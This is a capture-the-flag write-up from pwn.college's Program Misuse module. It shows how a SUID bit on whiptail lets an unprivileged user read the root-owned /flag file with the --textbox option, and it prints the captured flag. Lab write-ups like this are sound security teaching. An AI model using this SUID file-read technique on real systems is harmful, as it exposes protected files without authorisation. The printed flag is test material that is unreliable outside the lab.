---
layout: page
title: "Challenge Name: whiptail"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Beginner  
**Date**: 2025-07-16  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/whiptail`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/whiptail
```

Output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/whiptail
```

- The `s` in `-rws` indicates it's a SUID binary.
- `whiptail` runs with **root privileges**.

## 🚀 Exploitation

command in Linux is used to create simple text-based user interfaces (TUIs) in a terminal — like dialog boxes, menus, input prompts, etc. It's great for shell scripts that need a bit of interactivity without a GUI.

`whiptail` is similar to dialog, but lighter and more widely available by default (especially on minimal systems like Alpine or Debian installs).

The whiptail --textbox option is used to display the contents of a file (like logs, help text, or flag output) in a scrollable box inside the terminal.


```bash
whiptail --textbox /flag 20 70
```

Output:
```
 pwn.college{84uRmzv74josFOL7rJaPyrNFhpG.dVzNxwSM0IzMyEzW}
```
